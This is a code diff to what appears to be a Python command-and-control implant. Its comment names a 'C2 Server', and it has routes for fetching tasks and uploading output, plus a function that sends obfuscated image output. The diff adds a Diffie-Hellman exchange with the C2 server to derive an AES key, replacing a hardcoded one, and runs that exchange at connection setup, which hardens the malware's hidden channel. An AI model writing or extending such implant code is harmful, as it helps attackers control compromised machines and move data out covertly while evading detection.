@@ -4,14 +4,19 @@ import uuid
 import requests
 import subprocess
 import time
+from diffiehellman import DiffieHellman
 
-global_key = int("ffffffffffffffffffffffffffffffff", 16).to_bytes(16, "big")
+
+#global_key = int("ffffffffffffffffffffffffffffffff", 16).to_bytes(16, "big")
+global_key = None
 
 url = "http://localhost:80/" #remember to change this to the actual IP address of machine running the C2 Server.
 
 routes = {
     0 : url + "task", 
-    1: url + "upload"
+    1: url + "upload",
+    2: url + "getkey",
+    3: url + "sendkey"
 }
 
 #Encryption of data -- IV is concatenated at the end of message for decryption
@@ -75,6 +80,27 @@ def send_output(obf_img):
 def destroy(): 
     pass
 
+def key_dist():
+    global global_key
+    #getting server public key 
+    response = requests.get(routes[2])
+    response = response.json()
+    server_public_key = response["key"].encode("latin-1")
+
+    #sending generated public key 
+    dh = DiffieHellman(group=14, key_bits=540)
+    public_key = dh.get_public_key()
+    json_obj = {"key" : public_key.decode("latin-1")}
+    requests.post(routes[3], data=json_obj)
+
+    #deriving shared AES key
+    global_key=dh.generate_shared_key(server_public_key)
+    print(f"[+] Derived AES key: {global_key}")
+    return 
+
+
+
+
 #Setting up initial connection with C2 Server
 def init(): 
     tries = 0
@@ -84,6 +110,7 @@ def init():
             response = requests.get(url)
             print("[+] Connection Established...")
             print(response.text)
+            key_dist()
             return
         except Exception as e: 
             print("[-] Error in Contacting Server...")
